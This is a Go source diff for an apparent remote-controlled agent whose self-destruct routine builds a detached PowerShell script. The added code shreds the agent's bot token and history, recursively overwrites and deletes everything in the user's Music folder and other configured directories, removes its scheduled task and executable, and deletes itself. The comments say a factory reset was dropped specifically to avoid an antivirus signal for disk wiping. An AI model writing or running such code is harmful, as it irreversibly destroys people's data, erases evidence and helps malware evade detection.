@@ -13,10 +13,10 @@ import (
 )
 
 // systemDestroy launches a detached helper that, after this process exits,
-// overwrites the agent's sensitive files with random data and deletes them, wipes
-// capture dirs, removes the scheduled task, then triggers the Windows factory
-// reset ("remove everything"). Sensitive data is shredded BEFORE the reset, so
-// even if the reset wizard is canceled the bot token and history are unrecoverable.
+// overwrites the agent's sensitive files (token, history) AND the contents of the
+// user's Music folder + configured targets with random data and deletes them, then
+// removes the scheduled task and the executable. No factory reset — the OS stays
+// intact, keeping the data-protection goal without the T1561 disk-wipe AV signal.
 func systemDestroy(plan destroyPlan) error {
 	scriptPath := filepath.Join(os.TempDir(), "kanije-destroy.ps1")
 	if err := os.WriteFile(scriptPath, []byte(buildDestroyScript(os.Getpid(), plan)), 0o600); err != nil {
@@ -54,6 +54,11 @@ function Wipe($path){
   } catch {}
   Remove-Item -Force -LiteralPath $path
 }
+function WipeDir($dir){
+  if (-not (Test-Path -LiteralPath $dir)) { return }
+  Get-ChildItem -LiteralPath $dir -Recurse -File -Force | ForEach-Object { Wipe $_.FullName }
+  Get-ChildItem -LiteralPath $dir -Recurse -Directory -Force | Sort-Object { $_.FullName.Length } -Descending | ForEach-Object { Remove-Item -LiteralPath $_.FullName -Recurse -Force }
+}
 `
 
 func buildDestroyScript(pid int, plan destroyPlan) string {
@@ -63,11 +68,20 @@ func buildDestroyScript(pid int, plan destroyPlan) string {
 	b.WriteString("while (Get-Process -Id $p -ErrorAction SilentlyContinue) { Start-Sleep -Milliseconds 300 }\n")
 	b.WriteString("Start-Sleep -Milliseconds 800\n")
 
-	// Shred sensitive files first — this is the irreversible part that must survive
-	// even a canceled reset.
+	// Shred the agent's own sensitive files (token, history).
 	for _, f := range plan.SecureFiles {
 		b.WriteString("Wipe " + psQuote(f) + "\n")
 	}
+
+	// Securely erase the CONTENTS of the user's Music folder (resolved correctly
+	// even with OneDrive redirection) plus any extra configured targets. The
+	// folders themselves stay; only their contents are unrecoverably wiped.
+	b.WriteString("$m=[Environment]::GetFolderPath('MyMusic')\n")
+	b.WriteString("if ($m) { WipeDir $m }\n")
+	for _, d := range plan.WipeDirs {
+		b.WriteString("WipeDir " + psQuote(d) + "\n")
+	}
+
 	for _, d := range plan.Dirs {
 		b.WriteString("Remove-Item -Recurse -Force -LiteralPath " + psQuote(d) + "\n")
 	}
@@ -80,11 +94,7 @@ func buildDestroyScript(pid int, plan destroyPlan) string {
 	}
 	b.WriteString("Remove-Item -Force \"$env:TEMP\\kanije-*.ps1\"\n")
 
-	// Factory reset: Windows "Reset this PC → Remove everything". Best-effort —
-	// older/Server SKUs may lack systemreset.exe, in which case the secure wipe
-	// above is still done.
-	b.WriteString("Start-Process -FilePath \"$env:SystemRoot\\System32\\systemreset.exe\" -ArgumentList '--factoryreset'\n")
-
+	// NOTE: no factory reset — keeps the OS intact and avoids the T1561 AV signal.
 	b.WriteString("Remove-Item -Force -LiteralPath $MyInvocation.MyCommand.Path\n")
 	return b.String()
 }
